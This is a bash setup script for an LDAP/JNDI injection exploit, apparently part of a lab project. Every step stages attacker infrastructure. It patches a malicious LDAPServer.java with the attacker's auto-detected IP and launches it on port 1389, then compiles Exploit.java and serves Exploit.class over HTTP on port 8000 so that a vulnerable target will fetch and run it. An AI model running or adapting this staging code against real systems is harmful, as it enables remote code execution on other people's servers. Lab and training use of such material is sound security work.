#!/bin/bash
set -e

echo "[*] Fixing attacker setup for LDAP exploit..."

# Directories
SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
PROJECT_ROOT="$(realpath "$SCRIPT_DIR/..")"
LDAP_DIR="$PROJECT_ROOT/ldap"
LIB_DIR="$PROJECT_ROOT/webapp/libs"
EXPLOIT_DIR="$PROJECT_ROOT/exploit"
JAR_PATH="$LIB_DIR/unboundid-ldapsdk-4.0.14.jar"
JAR_URL="https://repo1.maven.org/maven2/com/unboundid/unboundid-ldapsdk/4.0.14/unboundid-ldapsdk-4.0.14.jar"

# 1. Create libs directory
mkdir -p "$LIB_DIR"

# 2. Download LDAP SDK if not present
if [ ! -f "$JAR_PATH" ]; then
    echo "[*] Downloading UnboundID LDAP SDK..."
    wget -O "$JAR_PATH" "$JAR_URL"
else
    echo "[*] Found existing LDAP SDK: $JAR_PATH"
fi

# 3. Get attacker's IP address (for eth0 / enp0s3 / default route)
ATTACKER_IP=$(ip route get 1 | awk '{for(i=1;i<=NF;i++) if ($i=="src") print $(i+1)}')
if [ -z "$ATTACKER_IP" ]; then
    echo "[-] Failed to auto-detect local IP address."
    exit 1
fi
echo "[+] Detected attacker IP: $ATTACKER_IP"

# 4. Patch LDAPServer.java with correct IP
LDAP_SERVER_FILE="$LDAP_DIR/LDAPServer.java"
if grep -q 'httpServer = "http://' "$LDAP_SERVER_FILE"; then
    sed -i "s|httpServer = \"http://.*:8000/\"|httpServer = \"http://$ATTACKER_IP:8000/\"|" "$LDAP_SERVER_FILE"
    echo "[*] Patched LDAPServer.java with IP: $ATTACKER_IP"
else
    echo "[-] Could not patch LDAPServer.java automatically. Please set httpServer manually."
fi

# 5. Compile LDAPServer.java
echo "[*] Compiling LDAPServer.java..."
cd "$LDAP_DIR"
javac -cp ".:$JAR_PATH" LDAPServer.java
echo "[+] LDAPServer compiled."

# 6. Start LDAP server
echo "[*] Starting LDAP server on port 1389..."
java -cp ".:$JAR_PATH" LDAPServer &
LDAP_PID=$!
echo "[+] LDAP server running (PID: $LDAP_PID)"

# 7. Validate and start HTTP server

if [ ! -f "$EXPLOIT_DIR/Exploit.class" ]; then
    echo "[*] Compiling Exploit.java..."
    cd "$EXPLOIT_DIR"
    javac -source 8 -target 8 Exploit.java
    echo "[+] Exploit.java compiled."
fi

if [ ! -f "$EXPLOIT_DIR/Exploit.class" ]; then
    echo "[-] Exploit.class not found in $EXPLOIT_DIR"
    echo "    -> Compile it with: javac -source 8 -target 8 Exploit.java"
    exit 1
fi

echo "[*] Starting HTTP server in $EXPLOIT_DIR..."
cd "$EXPLOIT_DIR"
python3 -m http.server 8000 > /dev/null 2>&1 &
HTTP_PID=$!
echo "[+] HTTP server running on port 8000 (PID: $HTTP_PID)"

# 8. Final status
echo
echo "[✓] Setup complete."
echo "    - LDAP server PID : $LDAP_PID"
echo "    - HTTP server PID : $HTTP_PID"
echo "    - Exploit URL     : http://$ATTACKER_IP:8000/Exploit.class"
